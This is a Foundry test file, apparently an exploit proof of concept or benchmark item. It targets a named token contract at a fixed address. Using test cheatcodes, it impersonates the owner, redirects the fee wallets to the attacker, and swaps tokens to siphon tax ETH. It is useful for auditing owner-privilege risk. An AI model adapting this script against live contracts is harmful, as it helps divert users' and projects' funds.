// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for the token contract
interface Shibtoro_0x8AeB7C2D4758eb51080493E2Cb290d62510659C7 {
    function getOwner() external view returns (address);
    function setWallets(address payable marketing, address payable development) external;
    function setContractSwapEnabled(bool enabled) external;
    function lpPair() external view returns (address);
    function dexRouter() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

// Router interface for swapping
interface IRouter02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x8AeB7C2D4758eb51080493E2Cb290d62510659C7;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to impersonate the owner
        address owner = Shibtoro_0x8AeB7C2D4758eb51080493E2Cb290d62510659C7(TARGET).getOwner();
        vm.label(owner, "Original Owner");

        // Label the contract for debugging
        vm.label(TARGET, "Shibtoro Contract");

        // Give attacker some ETH to work with
        deal(attacker, 10 ether);

        // Get the LP pair address from the contract
        address lpPair = Shibtoro_0x8AeB7C2D4758eb51080493E2Cb290d62510659C7(TARGET).lpPair();
        vm.label(lpPair, "LP Pair");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialAttackerBalance = address(this).balance;

        // Step 1: Impersonate the owner to change wallets
        address owner = Shibtoro_0x8AeB7C2D4758eb51080493E2Cb290d62510659C7(TARGET).getOwner();
        vm.startPrank(owner);

        // Set both marketing and development wallets to attacker address
        Shibtoro_0x8AeB7C2D4758eb51080493E2Cb290d62510659C7(TARGET).setWallets(
            payable(attacker), 
            payable(attacker)
        );

        // Ensure contract swap is enabled (should already be true after liquidity added)
        Shibtoro_0x8AeB7C2D4758eb51080493E2Cb290d62510659C7(TARGET).setContractSwapEnabled(true);

        vm.stopPrank();

        // Step 2: Buy some tokens to create tax accumulation
        // First, get router address from contract
        IRouter02 router = IRouter02(Shibtoro_0x8AeB7C2D4758eb51080493E2Cb290d62510659C7(TARGET).dexRouter());
        address weth = router.WETH();

        // Prepare swap path: WETH -> Token
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        // Buy tokens (swap ETH for tokens)
        vm.prank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 0.1 ether
        }(
            0, // amountOutMin
            path,
            attacker,
            block.timestamp
        );

        // Step 3: Sell tokens to trigger tax collection and distribution
        // Get token balance after purchase
        uint256 tokenBalance = Shibtoro_0x8AeB7C2D4758eb51080493E2Cb290d62510659C7(TARGET).balanceOf(attacker);

        // Approve router to spend tokens
        vm.prank(attacker);
        Shibtoro_0x8AeB7C2D4758eb51080493E2Cb290d62510659C7(TARGET).approve(address(router), tokenBalance);

        // Prepare sell path: Token -> WETH
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = weth;

        // Sell half of tokens to trigger contract swap
        vm.prank(attacker);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance / 2,
            0, // amountOutMin
            sellPath,
            attacker,
            block.timestamp
        );

        // Step 4: Wait for contract swap to process (if timer is set)
        // The contract swap happens during the sell transaction, so ETH should already be distributed

        // Step 5: Verify attacker's ETH balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialAttackerBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

